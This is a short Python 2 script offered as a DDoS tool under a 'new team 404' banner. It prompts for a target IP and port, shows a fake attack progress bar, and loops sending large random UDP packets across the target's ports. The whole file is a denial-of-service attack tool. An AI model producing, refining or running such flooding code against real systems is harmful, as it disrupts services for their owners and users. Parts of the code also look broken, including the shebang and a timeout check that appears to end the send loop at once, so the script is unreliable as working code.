#!/usr/bin

import sys
import os
import time
import socket
import random
#recoderby:#dios#de#la#web
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#config#one
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time()
#config#two
os.system("clear")
print (''' \033[91m
▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░

recoder by: dios de la web
new team 404 

─╔╗╔╗───╔═╗  ─╔╗─╔╗───╔═╗
╔╝║╠╣╔═╗║═╣  ╔╝║╔╝║╔═╗║═╣
║╬║║║║╬║╠═║  ║╬║║╬║║╬║╠═║
╚═╝╚╝╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
───────────  ────────────\033[92m]
 ''')

ip = raw_input("IP Target :")
port = input("Port      :")

os.system("clear")
print "\033[91mStart Attack DDos"
print "\033[91m|                    | 0%"
time.sleep(5)
print "\033[91m|>>>>>               | 25%"
time.sleep(5)
print "\033[91m|>>>>>>>>>>          | 50%"
time.sleep(5)
print "\033[91m|>>>>>>>>>>>>>>>>    | 75%"
time.sleep(5)
print "\033[91m|>>>>>>>>>>>>>>>>>>>>| 100%"
time.sleep(3)
os.system("clear")
sent = 0
while True:
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        port = port + 1
        print "\033[92mSent %s packet to %s throught port:%s successful" %(sent,ip,port)
        if port == 65534:
            port = 1
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
#gogrouplinuxnethunter
